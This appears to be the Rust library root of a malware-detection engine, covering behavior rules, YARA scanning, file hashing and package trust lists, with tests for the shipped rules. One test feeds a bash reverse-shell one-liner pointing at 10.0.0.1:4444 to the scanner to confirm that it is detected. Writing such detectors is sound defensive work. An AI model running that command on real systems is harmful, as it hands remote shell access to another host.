//! Detection content for the Synapse engine (spec 7): behavior rules in TOML (L3), YARA-X scanning (L2), file hashing for
//! the hash table (L1) and pacman's per-package file lists for trust (L0). No I/O happens here unless asked: the engine
//! decides what to read and when.

#![cfg_attr(test, allow(clippy::unwrap_used, clippy::expect_used))]

pub mod matcher;
pub mod mtree;
pub mod rule;
pub mod scan;
pub mod window;

use std::path::{Path, PathBuf};

#[derive(Debug, thiserror::Error)]
pub enum Error {
    #[error("I/O error on {}: {source}", path.display())]
    Io {
        path: PathBuf,
        #[source]
        source: std::io::Error,
    },
    #[error("invalid rules:{}", .0.iter().map(|p| format!("\n  - {p}")).collect::<String>())]
    Rules(Vec<String>),
    #[error("scan failed: {0}")]
    Scan(String),
    #[error("pacman mtree: {0}")]
    Mtree(String),
}

impl Error {
    pub fn io(path: &Path, source: std::io::Error) -> Error {
        Error::Io {
            path: path.to_path_buf(),
            source,
        }
    }
}

pub type Result<T> = std::result::Result<T, Error>;

#[cfg(test)]
mod shipped {
    use std::path::PathBuf;
    use std::time::Duration;

    fn rules_root() -> PathBuf {
        PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../rules")
    }

    #[test]
    fn the_shipped_behavior_rules_are_valid() {
        let set = crate::rule::RuleSet::load_dir(&rules_root().join("behavior")).unwrap();
        assert!(set.rules.len() >= 10, "{} rules", set.rules.len());
        assert!(set.rules.iter().all(|r| r.id.starts_with("SYN-B-")));
    }

    #[test]
    fn the_shipped_yara_rules_compile_and_find_eicar() {
        let y = crate::scan::Yara::load_dir(&rules_root().join("yara"), Duration::from_secs(5))
            .unwrap();
        let hits = y.scan_bytes(crate::scan::EICAR).unwrap();
        assert_eq!(
            hits.iter().map(|h| h.rule.as_str()).collect::<Vec<_>>(),
            ["eicar_test_file"]
        );
        assert!(y
            .scan_bytes(b"#!/bin/sh\nexec bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
            .unwrap()
            .iter()
            .any(|h| h.rule == "reverse_shell_oneliner"));
        assert!(y
            .scan_bytes(b"#!/bin/sh\nset -e\nmake install\n")
            .unwrap()
            .is_empty());
    }
}
